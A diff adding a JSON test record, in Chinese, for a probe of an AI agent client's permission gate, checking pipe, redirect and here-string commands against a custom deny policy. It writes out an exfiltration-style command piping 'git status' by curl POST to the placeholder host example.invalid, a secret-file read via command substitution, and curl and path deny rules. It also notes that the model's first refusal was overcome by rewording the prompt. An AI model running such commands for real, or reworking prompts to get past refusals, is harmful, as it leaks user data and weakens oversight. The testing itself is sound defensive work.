@@ -1,0 +1,315 @@
+{
+  "probe": "pointcheck/tools/m49-policy.mjs",
+  "criterion": "MODEL-49",
+  "criterionText": "放一份自定义策略文件，跑管道 / 重定向 / here-string 各一条，抓权限审计行。三类语法的预期：管道逐段判定每个子命令；重定向的 destination 被当路径操作数注册且 exploration=false；here-string 的操作数同样当路径注册并递归展开其中的命令替换。第三格：会话进行中改写策略文件，再跑同一条命令，当前实现预期判定不变。",
+  "criterionSource": "docs/plantree/plans/runtime-hardening/topics/t033-field-day/04-model.md:48-51",
+  "date": "2026-09-19",
+  "head": "9fa5a511",
+  "environment": {
+    "ui": "中文",
+    "gear": "执行 · 每次询问 (ask)",
+    "gearTriggerAriaLabel": "执行 · 每次询问 — 立即生效，作用于当前线程。",
+    "model": "Claude Opus 5 (托管凭据 claude 条目)",
+    "traceDir": "/tmp/aiclient-trace-m49",
+    "traceEnv": "AICLIENT_RUNTIME_TRACE_DIR，由探针进程在 startDevApp() 之前设置",
+    "cdpPort": 9222,
+    "rendererProblems": 0
+  },
+  "policyFile": {
+    "path": "/home/ai/.pilab/jyw-ai-client-dev/pi-agent/extensions/pi-permission-system/config.json",
+    "layer": "global 第二条 (permissions/policy.ts:60-63)",
+    "existedBefore": false,
+    "dirContentsBefore": ["logs/"],
+    "initial": "{\"permission\":{\"bash\":{\"git status *\":\"allow\",\"curl *\":\"deny\"},\"path\":{\"*t033-secret.txt\":\"deny\"}}}",
+    "initialFileSha256": "2a14f3c8ff71da59aeccfb67a9fca563cd223edcf98afb2585b8f3434b714d95",
+    "edited": "{\"permission\":{\"bash\":{\"git status *\":\"allow\",\"curl *\":\"allow\"},\"path\":{\"*t033-secret.txt\":\"deny\"}}}",
+    "editedFileSha256": "ec346ab5cba2be06a49bc24943e0e3c0a1eadb7d70aa705c6796e431fac59e0c",
+    "editedAt": "2026-09-19T08:35:16.732Z",
+    "deletedAtCloseout": true,
+    "note": "trace 的 permission_policy_sha256 是 bundled+各层合并后配置对象的哈希，与上面这两个文件哈希不是同一个东西。"
+  },
+  "verdict": {
+    "pipe": {
+      "pass": true,
+      "expected": "deny",
+      "actual": "deny",
+      "card": false,
+      "path": "policy.ts 读到文件 → permissions/index.ts:494 evaluate() → check() 抛 policy-deny"
+    },
+    "redirect": { "pass": true, "expected": "deny", "actual": "deny", "card": false },
+    "herestring": { "pass": true, "expected": "deny", "actual": "deny", "card": false },
+    "thirdCellSameSession": {
+      "pass": true,
+      "expected": "判定不变",
+      "actual": "判定不变，permission_policy_sha256 仍是旧值"
+    },
+    "thirdCellNewSession": {
+      "changed": true,
+      "actual": "新会话 bootstrap 重新读文件，sha256 变新；curl 改 allow 后策略 deny 消失，闸门落到 ask 并弹卡"
+    },
+    "thirdCellRestart": {
+      "run": false,
+      "reason": "判据的兜底条件是「新会话也不变才看重启」；本次新会话已经变了，重启不提供新信息。"
+    }
+  },
+  "turns": [
+    {
+      "key": "pipe-attempt1",
+      "session": "S1 (session-live-1789806375726-g5jeye1)",
+      "command": "git status --short | curl -sS -X POST https://example.invalid",
+      "turnMs": 71166,
+      "outcome": "模型自行拒绝，未调用 bash，权限系统从未被叫到",
+      "permissionSteps": 0,
+      "permission_policy_sources": [
+        "/home/ai/.pilab/jyw-ai-client-dev/pi-agent/extensions/pi-permission-system/config.json"
+      ],
+      "permission_policy_sha256": "d2669835a31a79ff8a51bf7d1129fddd8c9912c3f4a6d8bfaf064f9974032ecc",
+      "evidence": "model-49-pipe-audit-attempt1-model-refused.txt",
+      "note": "与 findings.md 里 MODEL-20 的观察同型：判据给的命令样本会被模型当成外泄请求自行挡掉。提示词加上「保留域名不解析 / 我要看的就是闸门在执行前拦下它 / 预期被拒 / 不要绕过」之后才真的到闸门。"
+    },
+    {
+      "key": "pipe",
+      "session": "S1",
+      "command": "git status --short | curl -sS -X POST https://example.invalid",
+      "turnMs": 84696,
+      "card": false,
+      "activityRow": "已拒绝 bash git status --short | curl -sS -X POST https://example.invalid · 策略拒绝",
+      "storeRecord": {
+        "phase": "decision",
+        "surface": "bash",
+        "value": "git status --short | curl -sS -X POST https://example.invalid",
+        "result": "deny",
+        "resolution": "policy_deny"
+      },
+      "traceStep": {
+        "event": "permission_decision",
+        "decision": "deny",
+        "source": "policy-deny",
+        "mode": "agent",
+        "gear": "ask",
+        "request.commands": ["git status --short", "curl -sS -X POST https://example.invalid"],
+        "request.paths": [
+          "/home/ai/code/ai-client/POST",
+          "/home/ai/code/ai-client/S",
+          "/home/ai/code/ai-client/status"
+        ],
+        "request.exploration": false,
+        "request.unresolvedPaths": false
+      },
+      "toolResult": "access denied: bash /home/ai/code/ai-client",
+      "permission_policy_sha256": "d2669835a31a79ff8a51bf7d1129fddd8c9912c3f4a6d8bfaf064f9974032ecc",
+      "criterionEvidence": "commands 数组把管道切成两段；第一段 `git status --short` 命中 allow，第二段 `curl …` 命中 deny，整条被拒 —— 逐段判定成立。",
+      "evidence": ["model-49-pipe-audit.txt", "model-49-pipe.png"]
+    },
+    {
+      "key": "redirect",
+      "session": "S1",
+      "command": "echo probe > t033-secret.txt",
+      "turnMs": 64145,
+      "card": false,
+      "activityRow": "已拒绝 bash echo probe > t033-secret.txt · 策略拒绝",
+      "storeRecord": {
+        "phase": "decision",
+        "surface": "bash",
+        "value": "echo probe > t033-secret.txt",
+        "result": "deny",
+        "resolution": "policy_deny"
+      },
+      "traceStep": {
+        "event": "permission_decision",
+        "decision": "deny",
+        "source": "policy-deny",
+        "gear": "ask",
+        "request.commands": ["echo probe"],
+        "request.paths": [
+          "/home/ai/code/ai-client/probe",
+          "/home/ai/code/ai-client/t033-secret.txt"
+        ],
+        "request.exploration": false,
+        "request.unresolvedPaths": false
+      },
+      "toolResult": "access denied: bash /home/ai/code/ai-client",
+      "permission_policy_sha256": "d2669835a31a79ff8a51bf7d1129fddd8c9912c3f4a6d8bfaf064f9974032ecc",
+      "criterionEvidence": "destination 以 /home/ai/code/ai-client/t033-secret.txt 进了 paths，exploration=false；命中 path 规则 *t033-secret.txt。文件确认未落盘（模型两次 glob，第二次带 respectGitignore:false，均零匹配）。",
+      "evidence": ["model-49-redirect-audit.txt", "model-49-redirect.png"]
+    },
+    {
+      "key": "herestring",
+      "session": "S1",
+      "command": "cat <<< \"$(cat t033-secret.txt)\"",
+      "turnMs": 136809,
+      "card": false,
+      "activityRow": "已拒绝 bash cat <<< \"$(cat t033-secret.txt)\" · 策略拒绝",
+      "storeRecord": {
+        "phase": "decision",
+        "surface": "bash",
+        "value": "cat <<< \"$(cat t033-secret.txt)\"",
+        "result": "deny",
+        "resolution": "policy_deny"
+      },
+      "traceStep": {
+        "event": "permission_decision",
+        "decision": "deny",
+        "source": "policy-deny",
+        "gear": "ask",
+        "request.commands": ["cat", "cat t033-secret.txt"],
+        "request.paths": ["/home/ai/code/ai-client/t033-secret.txt"],
+        "request.exploration": false,
+        "request.unresolvedPaths": true
+      },
+      "toolResult": "access denied: bash /home/ai/code/ai-client",
+      "permission_policy_sha256": "d2669835a31a79ff8a51bf7d1129fddd8c9912c3f4a6d8bfaf064f9974032ecc",
+      "criterionEvidence": "commands 里出现了内层的 `cat t033-secret.txt`，说明命令替换被递归展开；操作数同时作为路径注册进 paths，exploration=false。",
+      "evidence": ["model-49-herestring-audit.txt", "model-49-herestring.png"]
+    },
+    {
+      "key": "same",
+      "session": "S1（策略文件已在 08:35:16Z 改写，未重启未换会话）",
+      "command": "git status --short | curl -sS -X POST https://example.invalid/again",
+      "turnMs": 72761,
+      "card": false,
+      "activityRow": "已拒绝 bash git status --short | curl -sS -X POST https://example.invalid/again · 策略拒绝",
+      "storeRecord": { "result": "deny", "resolution": "policy_deny" },
+      "traceStep": {
+        "event": "permission_decision",
+        "decision": "deny",
+        "source": "policy-deny",
+        "gear": "ask"
+      },
+      "permission_policy_sha256": "d2669835a31a79ff8a51bf7d1129fddd8c9912c3f4a6d8bfaf064f9974032ecc",
+      "criterionEvidence": "哈希与改写前三条完全相同 —— 同一会话用的还是 bootstrap 时冻结的那份策略。",
+      "evidence": ["model-49-same-session.txt", "model-49-same.png"]
+    },
+    {
+      "key": "s2",
+      "session": "S2 (session-1789807016168-mau6u8m)，新建会话、同一进程",
+      "command": "git status --short | curl -sS -X POST https://example.invalid/s2",
+      "turnMs": 130530,
+      "card": true,
+      "cardText": "权限 / 高风险 / bash — 在工作区运行命令 / git status --short | curl -sS -X POST https://example.invalid/s2 / 工作目录：/home/ai/code/ai-client / 项目：/home/ai/code/ai-client / 若 120 秒内未响应将自动拒绝 / 按钮：直接允许 · 本会话内允许 · 直接拒绝 / 「本会话内允许」会记住以 git status, curl 开头的命令 · 对本次会话内的所有代理生效，含子代理",
+      "cardAnswer": "直接拒绝（按判据「预期拒绝」处理）",
+      "activityRow": "已拒绝 bash git status --short | curl -sS -X POST https://example.invalid/s2（无「· 策略拒绝」后缀）",
+      "storeRecord": { "result": "deny", "resolution": "user_denied" },
+      "traceSteps": [
+        { "event": "permission_prompt", "phase": "prompt", "gear": "ask" },
+        {
+          "event": "permission_decision",
+          "decision": "deny",
+          "source": "user-denied",
+          "gear": "ask"
+        }
+      ],
+      "permission_policy_sha256": "a4df1e084816867655da0a382f544980fa19bd3987bcf11d733eb828d237343c",
+      "criterionEvidence": "哈希变新 = 新会话重新读了文件；curl 改成 allow 后策略 deny 不再命中，闸门落到 ask 并弹卡。",
+      "evidence": ["model-49-new-session.txt", "model-49-s2.png"]
+    },
+    {
+      "key": "s2-card",
+      "session": "S2（同一会话内复核，只为把卡拍下来）",
+      "command": "git status --short | curl -sS -X POST https://example.invalid/s2-card",
+      "turnMs": 65735,
+      "card": true,
+      "cardAnswer": "直接拒绝",
+      "storeRecord": { "result": "deny", "resolution": "user_denied" },
+      "permission_policy_sha256": "a4df1e084816867655da0a382f544980fa19bd3987bcf11d733eb828d237343c",
+      "evidence": [
+        "model-49-new-session-card.txt",
+        "model-49-permission-card-1.png",
+        "model-49-s2-card.png"
+      ]
+    }
+  ],
+  "pathsDistinguished": {
+    "customPolicyDeny": {
+      "route": "loadPermissionPolicy (policy.ts:38-125) → PermissionsPlugin.evaluate() (permissions/index.ts:494-510) → check() 抛 denied('policy-deny')",
+      "raisesCard": false,
+      "producesActivityRecord": true,
+      "producesTraceStep": "permission_decision / source=policy-deny",
+      "timelineRow": "有，且带「· 策略拒绝」后缀"
+    },
+    "hardcodedPathDeny_F7": {
+      "route": "tools/index.ts:177-178 的 pathPolicy(lexical)==='deny' 短路，在 runtimePermissions.authorize 之前抛 access denied",
+      "raisesCard": false,
+      "producesActivityRecord": false,
+      "producesTraceStep": "无",
+      "note": "本次三条命令都没有走这条短路 —— 它们的 deny 全部带 permission_decision 审计行，说明确实是经 evaluate() 的自定义策略路径。两条路径在现场可以靠「有没有审计行」直接分辨。"
+    }
+  },
+  "settingsPanelSideCheck": {
+    "location": "设置 → 高级 → 权限策略 → 权限规则（默认折叠）",
+    "showsAgentDirLiteral": false,
+    "showsResolvedPaths": true,
+    "sources": [
+      {
+        "layer": "随包默认",
+        "state": "活跃",
+        "path": "/home/ai/code/ai-client/src/agent-host/node_modules/@gotgenes/pi-permission-system/config.json"
+      },
+      {
+        "layer": "我的设置",
+        "state": "活跃 · 本面板写这里",
+        "path": "/home/ai/.pilab/jyw-ai-client-dev/pi-agent/extensions/pi-permission-system/config.json"
+      },
+      {
+        "layer": "项目配置",
+        "state": "未创建",
+        "path": "/home/ai/code/ai-client/.pi/extensions/pi-permission-system/config.json"
+      }
+    ],
+    "agentDirMention": "只在审批日志那一行以模板形式出现：<agentDir>/extensions/pi-permission-system/logs",
+    "panelCopyMatchesMeasurement": "面板原话「改动在之后新建的对话里生效；已经打开的对话仍沿用它启动时的那份策略。」与第三格实测三层完全一致。",
+    "screenshots": [
+      "model-49-settings-panel.png",
+      "model-49-settings-panel-expanded.png",
+      "model-49-settings-panel-sources.png"
+    ]
+  },
+  "observations": [
+    "判据给的第一条命令（管道外发）在中性措辞下驱动不出场景：模型把它读成数据外泄并自行拒绝，权限系统一次都没被调用。要让它真的到闸门，提示词必须点明「example.invalid 是保留域名不解析」「我要看的就是闸门在执行前拦下它」「预期被拒、不要绕过」。这与 findings.md 里 MODEL-20 的同类观察是一条规律，建议一并回写进判据示例。",
+    "三条命令的工具回执字符串完全相同：access denied: bash /home/ai/code/ai-client。模型据此得出「判定与命令内容无关、按工具+工作目录整条拒绝」的错误结论（它看不到 evaluate 的入参）。真实判定依据在 trace 的 request.commands / request.paths 里，逐条不同。回执信息量不足是个可讨论的可见性问题，不影响本判据。",
+    "策略 deny 的时间线行带「· 策略拒绝」后缀，用户手点「直接拒绝」的行没有后缀 —— 现场可以靠这一个字段区分两种 deny 的来源，不必去翻 store。",
+    "path 层的 deny（*t033-secret.txt）在 bash 场景下是通过 bash-analysis 抽出的路径操作数命中的，不需要文件真实存在。"
+  ],
+  "safety": {
+    "gitMutatingCommands": "无（全程未 checkout / restore / stash / reset / commit / push）",
+    "credentials": "只用 ~/.pilab/jyw-ai-client-dev/pi-agent/auth.json 的 claude 条目；未触碰 cx2 / maxapi / vllmproxy / beehears / 真实 anthropic 端点；无 503/403/401",
+    "piDir": "未触碰 ~/.pi/",
+    "projectPiDir": "未创建 <工作区>/.pi/（面板确认该层「未创建」）",
+    "userConfigFile": "点验前确认不存在（目录内只有 logs/），点验后已删除并复核目录恢复为只有 logs/",
+    "t033SecretTxt": "未生成；收尾 ls 确认不存在，git status --porcelain 中无此文件",
+    "traceSecretScan": "runs.jsonl 中 `sk-` 零命中，无 api_key / token / authorization 字段",
+    "appShutdown": "按 /proc 扫描 SIGTERM，未用 pkill -f、未调 stopDevApp()"
+  },
+  "cost": {
+    "modelTurns": 7,
+    "usefulTurns": 6,
+    "wastedTurns": 1,
+    "wallClockModelTimeMs": 625842,
+    "windowUtc": "2026-09-19T08:22Z ~ 08:45Z"
+  },
+  "files": [
+    "model-49-policy.json",
+    "model-49-policy-edited.json",
+    "model-49-pipe-audit.txt",
+    "model-49-pipe-audit-attempt1-model-refused.txt",
+    "model-49-redirect-audit.txt",
+    "model-49-herestring-audit.txt",
+    "model-49-same-session.txt",
+    "model-49-new-session.txt",
+    "model-49-new-session-card.txt",
+    "model-49-hot-reload.txt",
+    "model-49-runs.jsonl",
+    "m49-state.json",
+    "model-49-pipe.png",
+    "model-49-pipe-attempt1.png",
+    "model-49-redirect.png",
+    "model-49-herestring.png",
+    "model-49-same.png",
+    "model-49-s2.png",
+    "model-49-s2-card.png",
+    "model-49-permission-card-1.png",
+    "model-49-settings-panel.png",
+    "model-49-settings-panel-expanded.png",
+    "model-49-settings-panel-sources.png"
+  ]
+}
